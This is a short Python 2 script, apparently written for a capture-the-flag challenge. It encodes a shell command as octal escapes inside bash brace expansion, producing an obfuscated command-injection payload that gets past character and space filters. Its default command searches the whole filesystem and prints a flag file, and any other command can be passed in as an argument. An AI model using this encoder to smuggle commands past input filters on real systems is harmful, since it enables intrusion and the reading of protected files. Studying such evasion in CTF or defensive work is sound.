#!/usr/bin/env python
import sys

cmd = "find / -name flag.txt -exec cat {} +"
if len(sys.argv) == 2:
    cmd = sys.argv[1]

cmd = filter(None, cmd.split(' ')) # Remove empty items from list
output = "{"

for part in cmd:
    output += "$'"
    for c in part:
        output += "\\{}".format(oct(ord(c))[1:])
    output += "',"

output += "}"
print output
